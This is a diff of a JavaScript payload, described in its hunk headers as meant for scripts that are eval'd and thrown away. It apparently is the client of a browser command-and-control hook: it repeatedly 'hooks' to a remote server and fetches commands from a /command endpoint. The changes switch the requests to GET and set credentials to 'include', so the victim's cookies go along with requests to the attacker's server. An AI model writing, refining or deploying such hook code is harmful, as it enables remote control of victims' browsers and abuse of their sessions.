@@ -16,21 +16,17 @@ This payload if for non-persistent scripts that after eval'd can be thrown away
         for (let nConnectionAttemps = 0; nConnectionAttemps < 4; nConnectionAttemps++) {
             console.log("Hooking to server... ");
             try {
-                const res = await fetch(`http://${serverAddress}/hook`, { // TODO: change from local host
-                    method: "POST",
-                    mode: 'cors', // Change to 'cors' to handle the response properly
+                const res = await fetch(`http://${serverAddress}/hook/`, {
+                    method: "GET",
+                    mode: 'cors',
                     headers: {
                         'Content-Type': 'application/json'
-                    }
+                    },
+                    credentials: "include"
                 });
-    
+
                 if (!res.ok) {
                     throw new Error(`HTTP error! status: ${res.status}`);
-                }
-    
-                let data = await res.json();
-                if (!data.message) {
-                    throw new Error("Message field is empty in response. ");
                 }
 
                 return true;
@@ -49,13 +45,13 @@ This payload if for non-persistent scripts that after eval'd can be thrown away
     async function sendRequest(serverAddress) {
         console.log("Fetching command from server...");
         try {
-            const res = await fetch(`http://${serverAddress}/command`, { // TODO: change from local host
-                method: "POST",
-                mode: 'cors', // Change to 'cors' to handle the response properly
+            const res = await fetch(`http://${serverAddress}/command/`, {
+                method: "GET",
+                mode: 'cors', 
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                credentials: "same-origin"
+                credentials: "include"
             });
 
             if (!res.ok) {
